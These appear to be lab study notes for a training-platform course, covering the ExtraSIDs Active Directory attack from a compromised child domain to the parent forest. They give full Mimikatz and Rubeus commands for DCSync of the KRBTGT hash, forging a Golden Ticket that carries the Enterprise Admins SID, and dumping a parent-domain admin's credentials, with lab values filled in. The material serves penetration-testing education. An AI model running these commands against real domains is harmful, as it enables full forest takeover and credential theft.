## ExtraSIDs Attack - Mimikatz

This attack allows for the compromise of a parent domain once the child domain has been compromised. If a user in a child domain that has their sidHistory set to the `Enterprise Admins group` (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest.

**To perform this attack after compromising a child domain, we need the following:**

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the [KRBTGT](https://adsecurity.org/?p=483) account, which is a service account for the Key Distribution Center (KDC) in Active Directory.

The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack


Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.

#### Obtaining the KRBTGT Account's NT Hash using Mimikatz

	PS C:\htb> mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

Next, we can use `Get-DomainGroup` from PowerView to obtain the SID for the Enterprise Admins group in the parent domain.

#### Obtaining Enterprise Admins Group's SID using Get-DomainGroup

	PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

Now we have everything , need to start this attack . 

Before the attack, we can confirm no access to the file system of the DC in the parent domain.
#### Using ls to Confirm No Access

	PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.

#### Creating a Golden Ticket with Mimikatz

	PS C:\htb> mimikatz.exe

	mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

	 <SNIP>

	Golden ticket for 'hacker @ LOGISTICS.INLANEFREIGHT.LOCAL' successfully submitted for current session

We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.

#### Confirming a Kerberos Ticket is in Memory Using klist

	PS C:\htb> klist

From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.

#### Listing the Entire C: Drive of the Domain Controller

	PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$


---

## ExtraSIDs Attack - Rubeus

We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.
#### Using ls to Confirm No Access Before Running Rubeus

	PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

#### Creating a Golden Ticket using Rubeus

The `/rc4` flag is the NT hash for the KRBTGT account. The `/sids` flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.

	PS C:\htb> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

Once again, we can check that the ticket is in memory using the `klist` command.

#### Confirming the Ticket is in Memory Using klist

	PS C:\htb> klist

Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the `lab_adm` Domain Admin user.

#### Performing a DCSync Attack

	PS C:\Tools\mimikatz\x64> .\mimikatz.exe

	mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm

**When dealing with multiple domains and our target domain is not the same as the user's domain, we will need to specify the exact domain to perform the DCSync operation on the particular domain controller.**

	mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL

---
We can use the PowerView `Get-DomainSID` function to get the SID for the child domain, but this is also visible in the Mimikatz output above.

#### Using Get-DomainSID

	PS C:\htb> Get-DomainSID 
	
	S-1-5-21-2806153819-209893948-922872689


